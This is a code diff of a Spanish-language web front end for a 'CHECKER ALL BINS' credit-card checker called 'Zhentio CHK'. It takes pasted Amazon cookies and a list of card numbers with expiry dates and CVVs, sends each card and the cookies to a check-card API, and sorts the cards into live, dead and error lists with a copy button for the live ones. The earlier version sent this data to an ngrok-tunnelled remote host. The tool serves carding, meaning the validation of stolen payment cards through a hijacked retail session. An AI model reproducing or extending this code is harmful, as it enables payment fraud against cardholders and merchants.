@@ -1,10 +1,10 @@
 <!DOCTYPE html>
-<html lang="pt-BR">
+<html lang="es">
 <head>
   <meta charset="UTF-8" />
   <meta name="viewport" content="width=device-width, initial-scale=1" />
-  <title>ZHENTIO CHK</title>
-<link rel="icon" type="image/x-icon" href="data:image/x-icon;base64,AAABAAEAEBAAAAEACABoBQAAFgAAACgAAAAQAAAAIAAAAAEACAAAAAAAAAEAAAAAAAAAAAAAAAEAAAAAAAC2k4gA2awWAEscAQDowKoA660HAP3WAwD92AAA9sWVANWUDgCTQgUA/P7/AM2/ugA/EwIAPxEFAEETAgBDEwIARhkCAFkfLgBGHAIAuG0HAPf49wD81gQA0pUJAEUmDgD7/f0ANhEGAHJORQDz6OMA8enmADsPCQA+EwMAQBIAAEESAAA/FAYA8MYLAEEWAwD/+r8AVR4sAEQYAAC1bgIA/swCAP7PAgBmNAIA/dICAMRmBQDqrAYA/coOAH5eUQDSlAcA/tgCAPjFjgDTkRAA+f1MADsPAQB3U0MA5K4EAO/BlQD+ywkAaCwPANCUCADRlAgA/NQJAOevEADSlwgA/toAADQVCwA4GAIAPhUCAEMSAgBFEgIA9vmAAPnx7gDSlAkA0pUMAP7YBABtTUUArWQCAEwtFAA5EwYAPxEAAD4TBgBBEgMANhoSAEMVAwBGFQMA/NIFAPzYBQDSlAoAPyjcANWUCgD1x5cANRO5AK2KhQD///4AomwbAGM9MgBAFAEAQhQBAEATBwBXHSQAPxoBAEQUAQBDFQQAoksBAKeADwB8RQsA4qQfAOqtBAD/zgMA/MwPAP3UAwD/1wMA+v//AP3//wD///8AOxIFAEEUAgBDFggAs3ITAOmsAgD/zQEA/s4EAKl5KAD+0QQA0ZMJAP7WAQDu3BwAkUEAANOUFQD6/v0AjU4VAD8SBgBBEwAAQBQDAEEUAwB3VEsAQhQDAPbsigBDFAMARRMAALRsAgBHFwMA/80CAE8ZAAD90ggA/tYCANGUDQD7xJEA//n4AP3+/gDn0LUA7+zbAHVOQwA/EQQAQRMBAEAWAQBDEwEAs2sAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAPDw8V4B0c156Epp2Vzw8PDw8O1Q3d2sCMhsEAZwIPDw8SZt3LSYZcnFxlg2amjA8V5lMTIpwcXFxcV0fmpQKQyo1IZNxcQxQLmJyIEdxcXEfHzgHWoKQeGw5T5pxmlJxmpqaZox7BVtYUXkOGIEMFJpTnZ1ubkWXF3VoTnFxcQuaaSc+fWpVjigQKSuDXXEcDkIikQY2RDoVAwlcmpqamh8OJYsTD5p/HYQPZ5qamoaPY2AsIxqYS18Ahy+FmppZPAwRNAZvlSRAVkGampqNVzwzmh9hiUoxfk2amppmFjw8PFdlmmQ9Rm2amg6ISDx8Fjw8PJKaHpqamg4/PDw8PAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA=" />
+  <title>Zhentio CHK</title>
+  <link rel="icon" type="image/x-icon" href="favicon.ico" />
   <!-- bootstrap -->
   <link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/bootstrap/4.0.0/css/bootstrap.min.css" />
   <!-- fontawesome -->
@@ -17,38 +17,34 @@
       color: #fff;
       padding: 1rem;
     }
-    /* Contenedor principal */
     .container.text-white.rounded.shadow.p-3.my-4 {
       background: #181A1E;
       border-radius: 5px;
-      border: 1px solid #7f8c9a; /* borde gris suave */
+      border: 1px solid #7f8c9a;
     }
-    /* Botones principales */
     button {
       padding: 10px 20px;
       background-color: #181A1E;
       color: white;
-      border: 1px solid #7f8c9a; /* borde gris suave */
+      border: 1px solid #7f8c9a;
       cursor: pointer;
       border-radius: 5px;
       margin-right: 5px;
-      box-shadow: 0 0 5px 1px #7f8c9a; /* sombra gris suave */
+      box-shadow: 0 0 5px 1px #7f8c9a;
       transition: all 0.3s ease;
     }
     button:hover {
       background-color: #22252b;
-      border: 1px solid #a0a9b5; /* borde gris un poco más claro */
-      box-shadow: 0 0 8px 2px #a0a9b5; /* sombra gris más clara */
+      border: 1px solid #a0a9b5;
+      box-shadow: 0 0 8px 2px #a0a9b5;
     }
-    /* Nav tabs general */
     .nav-tabs {
       background-color: transparent;
       border-radius: 5px;
-      border: 1px solid #7f8c9a; /* borde gris suave */
+      border: 1px solid #7f8c9a;
       padding: 5px;
       margin-bottom: 0;
     }
-    /* Items tabs (los botones con iconos) */
     .nav-tabs .nav-item a.nav-link {
       background-color: transparent !important;
       border: 1px solid #7f8c9a;
@@ -64,54 +60,48 @@
       padding: 0;
       font-size: 20px;
     }
-    /* Hover en tabs */
     .nav-tabs .nav-item a.nav-link:hover {
       border-color: #a0a9b5;
       color: #a0a9b5;
       background-color: transparent !important;
     }
-    /* Tab activo */
     .nav-tabs .nav-item a.nav-link.active {
       border: 1px solid #7f8c9a;
       color: white !important;
       background-color: transparent !important;
     }
-    /* Contenido de tabs */
     .tab-content {
       background-color: #181A1E;
       color: #fff;
       padding: 15px 20px;
       border-radius: 5px;
-      border: 1px solid #7f8c9a; /* borde gris suave */
+      border: 1px solid #7f8c9a;
       min-height: 220px;
     }
-    /* Textareas */
     textarea {
       background: #181A1E;
       color: #fff;
       width: 100%;
       border-radius: 5px;
-      border: 1px solid #7f8c9a; /* borde gris suave */
+      border: 1px solid #7f8c9a;
       padding: 10px;
       resize: none;
     }
     textarea:focus {
       outline: none;
       box-shadow: none;
-      border: 1px solid #7f8c9a; /* borde gris suave al focus */
+      border: 1px solid #7f8c9a;
     }
-    /* Badges */
     .badge-warning {
       background-color: #ffc107;
       color: #212529;
       font-weight: 600;
     }
-    /* Contenedores de resultados */
     #lives, #dies, #errors {
       max-height: 250px;
       overflow-y: auto;
       padding: 10px;
-      border: 1px solid #7f8c9a; /* borde gris suave */
+      border: 1px solid #7f8c9a;
       border-radius: 5px;
       background-color: #0F1116;
       color: #fff;
@@ -120,23 +110,20 @@
       word-break: break-word;
       font-family: monospace;
       font-size: 0.9rem;
+      white-space: pre-line;
     }
   </style>
 </head>
 <body>
   <div class="container text-white rounded shadow p-3 my-4">
-    <div class="container-fluid">
-      <h3><i class="fas fa-cogs"></i> CHECKER BINS</h3>
+    <h3><i class="fas fa-cogs"></i> CHECKER ALL BINS</h3>
+    <div class="buttons mt-3">
+      <button id="chk-start"><i class="fas fa-play"></i> Iniciar</button>
+      <button id="chk-pause" disabled><i class="fas fa-pause"></i> Pausar</button>
+      <button id="chk-stop" disabled><i class="fas fa-stop"></i> Parar</button>
+      <button id="chk-clean"><i class="fas fa-trash-alt"></i> Limpiar</button>
     </div>
-    <div class="container-fluid mt-3">
-      <div class="buttons">
-        <button id="chk-start"><i class="fas fa-play"></i> Iniciar</button>
-        <button id="chk-pause" disabled><i class="fas fa-pause"></i> Pausar</button>
-        <button id="chk-stop" disabled><i class="fas fa-stop"></i> Parar</button>
-        <button id="chk-clean"><i class="fas fa-trash-alt"></i> Limpiar</button>
-      </div>
-    </div>
-    <div class="container-fluid mt-3">
+    <div class="mt-3">
       <span class="badge badge-warning" id="estatus">Esperando inicio...</span>
     </div>
   </div>
@@ -166,55 +153,41 @@
     </ul>
 
     <div class="tab-content" id="myTabContent">
-      <!-- HOME DO CHECKER -->
       <div class="tab-pane fade show active px-3 pt-4 pb-3" id="chk-home" role="tabpanel" aria-labelledby="home-tab">
         <div class="my-2">
-          Aprovadas: <span class="val-lives" style="font-weight: bold;">0</span>
-          Reprovadas: <span class="val-dies" style="font-weight: bold;">0</span>
-          Errors: <span class="val-errors" style="font-weight: bold;">0</span>
-          Testadas: <span class="val-tested" style="font-weight: bold;">0</span>
+          Aprobadas: <span class="val-lives" style="font-weight: bold;">0</span> |
+          Reprobadas: <span class="val-dies" style="font-weight: bold;">0</span> |
+          Errores: <span class="val-errors" style="font-weight: bold;">0</span> |
+          Testadas: <span class="val-tested" style="font-weight: bold;">0</span> |
           Total: <span class="val-total" style="font-weight: bold;">0</span>
         </div>
-
-        <!-- COOKIES PRIMERO -->
-        <div class="container-fluid p-0 mt-2">
+        <div class="mt-2">
           <label for="cookie_input"><i class="fas fa-cookie-bite"></i> Cookies</label>
           <textarea id="cookie_input" placeholder="Pega aquí tus cookies de Amazon..." rows="2"></textarea>
         </div>
-
-        <!-- TARJETAS DESPUÉS -->
-        <div class="container-fluid p-0 mt-2">
-          <label for="lista_cartoes"><i class="far fa-credit-card"></i> Lista de tarjetas:</label>
-          <textarea id="lista_cartoes" placeholder="Ingrese su lista..." rows="8"></textarea>
+        <div class="mt-2">
+          <label for="lista_cartoes"><i class="far fa-credit-card"></i> Lista de tarjetas (una por línea, formato CC|MM|AAAA|CVV):</label>
+          <textarea id="lista_cartoes" placeholder="Ejemplo: 4111111111111111|12|2025|123" rows="8"></textarea>
         </div>
       </div>
 
-      <!-- LIVES -->
       <div class="tab-pane fade px-3 pt-4 pb-3" id="chk-lives" role="tabpanel" aria-labelledby="profile-tab">
-        <h5>Aprovadas</h5>
-        <span>Total: <span class="val-lives">0</span></span>
-        <br />
-        <button id="copyButton"><i class="fas fa-copy"></i></button>
-        <button onclick="document.getElementById('lives').innerHTML = ''"><i class="fas fa-trash-alt"></i></button>
-        <div id="lives"></div>
+        <h5>Aprobadas</h5>
+        <button id="copyButton" title="Copiar aprobadas"><i class="fas fa-copy"></i></button>
+        <button onclick="document.getElementById('lives').innerText = ''" title="Limpiar aprobadas"><i class="fas fa-trash-alt"></i></button>
+        <pre id="lives"></pre>
       </div>
 
-      <!-- DIES -->
       <div class="tab-pane fade px-3 pt-4 pb-3" id="chk-dies" role="tabpanel" aria-labelledby="contact-tab">
-        <h5>Reprovadas</h5>
-        <span>Total: <span class="val-dies">0</span></span>
-        <br />
-        <button onclick="document.getElementById('dies').innerHTML = ''"><i class="fas fa-trash-alt"></i></button>
-        <div id="dies"></div>
+        <h5>Reprobadas</h5>
+        <button onclick="document.getElementById('dies').innerText = ''" title="Limpiar reprobadas"><i class="fas fa-trash-alt"></i></button>
+        <pre id="dies"></pre>
       </div>
 
-      <!-- ERRORS -->
       <div class="tab-pane fade px-3 pt-4 pb-3" id="chk-errors" role="tabpanel" aria-labelledby="errors-tab">
-        <h5>Erros</h5>
-        <span>Total: <span class="val-errors">0</span></span>
-        <br />
-        <button onclick="document.getElementById('errors').innerHTML = ''"><i class="fas fa-trash-alt"></i></button>
-        <div id="errors"></div>
+        <h5>Errores</h5>
+        <button onclick="document.getElementById('errors').innerText = ''" title="Limpiar errores"><i class="fas fa-trash-alt"></i></button>
+        <pre id="errors"></pre>
       </div>
     </div>
   </div>
@@ -228,107 +201,102 @@
   <script>
     let checkerInterval = null;
     let paused = false;
+    let currentIndex = 0;
+    let tarjetas = [];
+    let cookies = "";
 
-    function resetContadores() {
+    function resetCounters() {
       $(".val-lives, .val-dies, .val-errors, .val-tested, .val-total").text("0");
-      $("#lives, #dies, #errors").html("");
+      $("#lives, #dies, #errors").text("");
+      currentIndex = 0;
     }
 
-    $("#chk-start").click(function () {
-      const cookies = $("#cookie_input").val().trim();
-      const tarjetas = $("#lista_cartoes").val().trim().split("\n").filter(l => l.trim() !== "");
+    async function checkNextCard() {
+      if (paused) return;
+      if (currentIndex >= tarjetas.length) {
+        $("#estatus").text("Finalizado.");
+        $("#chk-start").attr("disabled", false);
+        $("#chk-pause, #chk-stop").attr("disabled", true);
+        return;
+      }
+
+      const card = tarjetas[currentIndex];
+      currentIndex++;
+      $(".val-tested").text(currentIndex);
+      $(".val-total").text(tarjetas.length);
+
+      try {
+        const res = await fetch('/api/check-card', {
+          method: 'POST',
+          headers: {'Content-Type': 'application/json'},
+          body: JSON.stringify({ card: card, cookies: cookies }),
+        });
+        const data = await res.json();
+
+        if (data.status === 'LIVE') {
+          $("#lives").append(card + " - LIVE ✅\n");
+          $(".val-lives").text(parseInt($(".val-lives").text()) + 1);
+        } else if (data.status === 'DIE') {
+          $("#dies").append(card + " - DEAD ❌\n");
+          $(".val-dies").text(parseInt($(".val-dies").text()) + 1);
+        } else {
+          $("#errors").append(card + " - ERROR ⚠️\n");
+          $(".val-errors").text(parseInt($(".val-errors").text()) + 1);
+        }
+      } catch (e) {
+        $("#errors").append(card + " - ERROR ⚠️\n");
+        $(".val-errors").text(parseInt($(".val-errors").text()) + 1);
+      }
+
+      setTimeout(checkNextCard, 1000); // Esperar 1 segundo antes del próximo
+    }
+
+    $("#chk-start").click(() => {
+      cookies = $("#cookie_input").val().trim();
+      tarjetas = $("#lista_cartoes").val().trim().split("\n").filter(l => l.trim() !== "");
 
       if (!cookies) {
         toastr.error("Por favor, ingresa las cookies primero.");
         return;
       }
-
       if (tarjetas.length === 0) {
         toastr.warning("No se ingresaron tarjetas.");
         return;
       }
 
-      resetContadores();
+      resetCounters();
       $("#estatus").text("Chequeando...");
-      $(this).attr("disabled", true);
+      $("#chk-start").attr("disabled", true);
       $("#chk-pause, #chk-stop").attr("disabled", false);
-
-      let index = 0;
-
-      checkerInterval = setInterval(() => {
-        if (paused) return;
-
-        if (index >= tarjetas.length) {
-          clearInterval(checkerInterval);
-          $("#estatus").text("Finalizado.");
-          $("#chk-start").attr("disabled", false);
-          $("#chk-pause, #chk-stop").attr("disabled", true);
-          return;
-        }
-
-        const card = tarjetas[index++];
-
-        $(".val-tested").text(index);
-        $(".val-total").text(tarjetas.length);
-
-        fetch('https://819c6c70d931.ngrok-free.app/api/check-card', {  
-          method: 'POST',
-          headers: {
-            'Content-Type': 'application/json',
-          },
-          body: JSON.stringify({
-            card: card,
-            cookies: cookies
-          }),
-        })
-          .then(response => response.json())
-          .then(data => {
-            if (data.status === 'LIVE') {
-              $("#lives").append(card + "\n");
-              $(".val-lives").text(parseInt($(".val-lives").text()) + 1);
-            } else if (data.status === 'DIE') {
-              $("#dies").append(card + "\n");
-              $(".val-dies").text(parseInt($(".val-dies").text()) + 1);
-            } else {
-              $("#errors").append(card + "\n");
-              $(".val-errors").text(parseInt($(".val-errors").text()) + 1);
-            }
-          })
-          .catch(() => {
-            $("#errors").append(card + "\n");
-            $(".val-errors").text(parseInt($(".val-errors").text()) + 1);
-          });
-
-      }, 600);
+      paused = false;
+      checkNextCard();
     });
 
-    $("#chk-pause").click(function () {
+    $("#chk-pause").click(() => {
       paused = !paused;
-      $(this).html(paused ? '<i class="fas fa-play"></i> Reanudar' : '<i class="fas fa-pause"></i> Pausar');
+      $("#chk-pause").html(paused ? '<i class="fas fa-play"></i> Reanudar' : '<i class="fas fa-pause"></i> Pausar');
       $("#estatus").text(paused ? "Pausado." : "Chequeando...");
     });
 
-    $("#chk-stop").click(function () {
-      clearInterval(checkerInterval);
-      checkerInterval = null;
-      paused = false;
+    $("#chk-stop").click(() => {
+      paused = true;
       $("#estatus").text("Detenido.");
       $("#chk-start").attr("disabled", false);
       $("#chk-pause, #chk-stop").attr("disabled", true);
       $("#chk-pause").html('<i class="fas fa-pause"></i> Pausar');
     });
 
-    $("#chk-clean").click(function () {
-      resetContadores();
+    $("#chk-clean").click(() => {
+      paused = true;
+      resetCounters();
       $("#cookie_input").val("");
       $("#lista_cartoes").val("");
-      $("#estatus").text("Aguardando inicio...");
+      $("#estatus").text("Esperando inicio...");
       $("#chk-start").attr("disabled", false);
       $("#chk-pause, #chk-stop").attr("disabled", true);
       $("#chk-pause").html('<i class="fas fa-pause"></i> Pausar');
     });
 
-    // Copiar aprobadas
     $("#copyButton").click(() => {
       const text = $("#lives").text();
       if (!text) {
@@ -344,3 +312,4 @@
   </script>
 </body>
 </html>
+
